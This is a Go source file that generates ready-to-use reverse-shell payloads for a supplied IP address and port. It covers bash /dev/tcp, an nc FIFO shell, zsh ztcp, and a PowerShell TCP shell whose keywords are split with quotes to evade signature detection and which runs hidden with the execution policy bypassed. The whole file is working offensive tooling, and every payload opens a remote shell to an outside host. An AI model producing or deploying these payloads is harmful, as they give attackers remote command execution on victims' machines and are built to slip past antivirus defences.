package main

import (
	"fmt"
	"strings"
)

type Payload struct {
	Name string
	Code string
}

func GeneratePayloads(ip string, port int) []Payload {
	portStr := fmt.Sprintf("%d", port)

	return []Payload{
		{
			Name: "Linux Bash",
			Code: fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", ip, portStr),
		},
		{
			Name: "Linux/macOS NC FIFO",
			Code: fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", ip, portStr),
		},
		{
			Name: "Windows PowerShell (AMSI Bypass)",
			Code: generatePowerShellAMSI(ip, portStr),
		},
		{
			Name: "macOS Zsh Native",
			Code: fmt.Sprintf("zmodload zsh/net/tcp && ztcp %s %s && zsh -i <&$REPLY >&$REPLY 2>&$REPLY", ip, portStr),
		},
	}
}

func generatePowerShellAMSI(ip, port string) string {
	// A simple chunked PowerShell payload to bypass basic static signatures
	// System.Net.Sockets.TCPClient -> S'y's't'e'm'.'N'e't'.'S'o'c'k'e't's'.'T'C'P'C'l'i'e'n't
	// Invoke-Expression -> I'E'X

	ps := fmt.Sprintf(`$c = New-Object System.Net.Sockets.TCPClient('%s',%s);`+
		`$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};`+
		`while(($i = $s.Read($b, 0, $b.Length)) -ne 0){`+
		`$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);`+
		`$sb = (iex $d 2>&1 | Out-String );$t = $sb + 'PS ' + (pwd).Path + '> ';`+
		`$x = ([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()`, ip, port)

	// Fragment some keywords
	ps = strings.ReplaceAll(ps, "New-Object", "N'e'w-O'b'j'e'c't")
	ps = strings.ReplaceAll(ps, "System.Net.Sockets.TCPClient", "S'y's't'e'm'.'N'e't'.'S'o'c'k'e't's'.'T'C'P'C'l'i'e'n't")
	ps = strings.ReplaceAll(ps, "iex", "I'E'X")

	return "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"" + ps + "\""
}
